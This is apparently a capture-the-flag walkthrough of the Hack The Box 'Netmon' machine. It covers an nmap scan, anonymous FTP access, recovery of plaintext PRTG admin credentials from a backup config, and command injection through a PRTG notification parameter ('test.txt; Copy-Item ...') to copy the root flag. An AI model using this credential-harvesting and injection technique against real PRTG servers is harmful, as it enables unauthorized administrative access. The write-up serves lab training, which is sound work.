# Netmon -https://www.hackthebox.com/machines/netmon
```bash
nmap -sC -sV 10.129.210.81      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-24 03:06 EDT
Nmap scan report for 10.129.210.81
Host is up (0.057s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-24T07:06:55
|_  start_date: 2024-05-24T07:00:53
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.08 seconds
```
```bash
ftp 10.129.210.81
Connected to 10.129.210.81.
220 Microsoft FTP Service
Name (10.129.210.81:boreas): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> pwd
Remote directory: /
ftp> ls
229 Entering Extended Passive Mode (|||49919|)
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
11-10-23  10:20AM       <DIR>          Windows
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49921|)
150 Opening ASCII mode data connection.
02-25-19  11:44PM       <DIR>          Administrator
01-15-24  11:03AM       <DIR>          Public
226 Transfer complete.
ftp> cd Administrator
550 Access is denied. 
ftp> cd Public
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49922|)
125 Data connection already open; Transfer starting.
01-15-24  11:03AM       <DIR>          Desktop
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.
ftp> cd Desktop
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49924|)
150 Opening ASCII mode data connection.
02-03-19  12:18AM                 1195 PRTG Enterprise Console.lnk
02-03-19  12:18AM                 1160 PRTG Network Monitor.lnk
05-24-24  03:01AM                   34 user.txt
226 Transfer complete.
ftp> cat user.txt
?Invalid command.
ftp> show user.txt
?Invalid command.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||49945|)
125 Data connection already open; Transfer starting.
100% |******************************************************************************************************|    34        0.58 KiB/s    00:00 ETA
226 Transfer complete.
34 bytes received in 00:00 (0.58 KiB/s)
```
```bash
$ cat user.txt  
eb95cbc81456daf1868db370ceefda60
```
```bash
cd ..
cd ..
cd ..
ftp> ls -la
229 Entering Extended Passive Mode (|||50069|)
150 Opening ASCII mode data connection.
11-20-16  10:46PM       <DIR>          $RECYCLE.BIN
02-03-19  12:18AM                 1024 .rnd
11-20-16  09:59PM               389408 bootmgr
07-16-16  09:10AM                    1 BOOTNXT
02-03-19  08:05AM       <DIR>          Documents and Settings
02-25-19  10:15PM       <DIR>          inetpub
05-24-24  03:00AM            738197504 pagefile.sys
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
12-15-21  10:40AM       <DIR>          ProgramData
02-03-19  08:05AM       <DIR>          Recovery
02-03-19  08:04AM       <DIR>          System Volume Information
02-03-19  08:08AM       <DIR>          Users
11-10-23  10:20AM       <DIR>          Windows
226 Transfer complete.
ftp> cd ProgramData
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50072|)
150 Opening ASCII mode data connection.
12-15-21  10:40AM       <DIR>          Corefig
02-03-19  12:15AM       <DIR>          Licenses
11-20-16  10:36PM       <DIR>          Microsoft
02-03-19  12:18AM       <DIR>          Paessler
02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
07-16-16  09:18AM       <DIR>          SoftwareDistribution
02-03-19  12:15AM       <DIR>          TEMP
11-20-16  10:19PM       <DIR>          USOPrivate
11-20-16  10:19PM       <DIR>          USOShared
02-25-19  10:56PM       <DIR>          VMware
226 Transfer complete.
ftp> cd Paessler
250 CWD command successful.
ftp> ls -la
229 Entering Extended Passive Mode (|||50216|)
150 Opening ASCII mode data connection.
05-24-24  03:42AM       <DIR>          PRTG Network Monitor
226 Transfer complete.
ftp> cd "PRTG Network Monitor"
250 CWD command successful.
ftp> ls -la
229 Entering Extended Passive Mode (|||50221|)
150 Opening ASCII mode data connection.
08-18-23  08:20AM       <DIR>          Configuration Auto-Backups
05-24-24  03:11AM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
05-24-24  03:11AM       <DIR>          Logs (Web Server)
05-24-24  03:06AM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
05-24-24  03:42AM              1672965 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.
```
```bash
ftp> get "PRTG Configuration.old.bak"
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
229 Entering Extended Passive Mode (|||50238|)
150 Opening ASCII mode data connection.
 67% |********************************************************************                                  |   757 KiB  756.57 KiB/s    00:00 ETAftp: Reading from network: Interrupted system call
  0% |                                                                                                      |    -1        0.00 KiB/s    --:-- ETA
550 The specified network name is no longer available.
```
```bash
cat 'PRTG Configuration.old.bak'
<dbpassword>
              <!-- User: prtgadmin -->
                PrTg@dmin2018
change PrTg@dmin2018 to PrTg@dmin2019
go to http://10.129.210.81/ and login with credentials.
we found prtg version 18.1.37.13946
go to setup, account settings, notifications and add new notification
put a random name to it
choose Notification Summarization Method as Always notify ASAP, never summarize
open execute program part

Copy-Item -Path "C: \Logfiles\* -Destination "C:\Drawings" - Recurse  # transform this
Copy-Item -Path "C:\Users\Administrator\Desktop\root.txt" -Destination "C:\Users\Public\root.txt" -Recurse

and  transform to this:
test.txt; Copy-Item -Path "C:\Users\Administrator\Desktop\root.txt" -Destination "C:\Users\Public\root.txt" -Recurse
paste it to parameter and choose program file as ps and save notification.

ftp 10.129.210.81
Connected to 10.129.210.81.
220 Microsoft FTP Service
Name (10.129.210.81:boreas): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> cd Users
250 CWD command successful.
ftp> cd Public
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50710|)
150 Opening ASCII mode data connection.
01-15-24  11:03AM       <DIR>          Desktop
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.

click to edit button at web page and click to send test notification button and then click ok
after you do this steps you will be able to see root.txt

ftp> ls
229 Entering Extended Passive Mode (|||50717|)
125 Data connection already open; Transfer starting.
01-15-24  11:03AM       <DIR>          Desktop
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
05-24-24  03:01AM                   34 root.txt
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.
ftp> get root.txt
local: root.txt remote: root.txt
229 Entering Extended Passive Mode (|||50719|)
125 Data connection already open; Transfer starting.
100% |******************************************************************************************************|    34        0.18 KiB/s    00:00 ETA
226 Transfer complete.
34 bytes received in 00:00 (0.18 KiB/s)
```
```bash
cat root.txt                    
24f1f0d713efc9c7c076e419ba6cdc06
```
  

